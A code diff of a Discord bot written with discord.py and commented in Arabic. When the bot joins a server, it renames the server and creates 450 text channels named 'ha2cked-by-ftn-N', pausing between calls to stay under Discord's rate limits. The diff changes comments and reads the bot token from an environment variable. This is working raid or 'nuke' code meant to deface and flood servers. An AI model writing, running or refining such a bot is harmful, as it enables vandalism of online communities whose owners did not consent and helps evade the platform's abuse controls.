@@ -1,4 +1,6 @@
+
 import asyncio
+import os
 import discord
 from discord.ext import commands
 
@@ -25,18 +27,16 @@ async def on_guild_join(guild):
     except Exception as e:
         print(f"Failed to rename guild: {e}")
 
-    # 2. إنشاء الرومات تلقائياً
-    # الحد الأقصى للرومات في سيرفر ديسكورد هو 500 روم، لذا سنحدد العدد بـ 450 لتجنب تجاوز الحد الأقصى
+    # 2. إنشاء الرومات تلقائياً (الحد الأقصى الآمن لتجنب حظر الـ Rate Limit)
     max_channels = 450
     created_count = 0
 
     for i in range(max_channels):
         try:
-            # ديسكورد يتطلب أن تكون أسماء الرومات النصية بحروف صغيرة وشرطات (أو سيتم تعديلها تلقائياً)
             channel_name = f"ha2cked-by-ftn-{i+1}"
             await guild.create_text_channel(name=channel_name)
             
-            # فاصل زمني بسيط جداً لتجنب حظر الـ Rate Limit من ديسكورد
+            # فاصل زمني لتجنب حظر ديسكورد
             await asyncio.sleep(0.4)
             created_count += 1
         except discord.HTTPException as e:
@@ -48,6 +48,5 @@ async def on_guild_join(guild):
 
     print(f"Finished setup. Created {created_count} channels in {guild.name}.")
 
-# استبدل 'YOUR_BOT_TOKEN' بتوكن بوت الخاص بك)
+# تشغيل البوت باستخدام متغير البيئة الآمن من الاستضافة
 bot.run(os.getenv("TOKEN"))
-
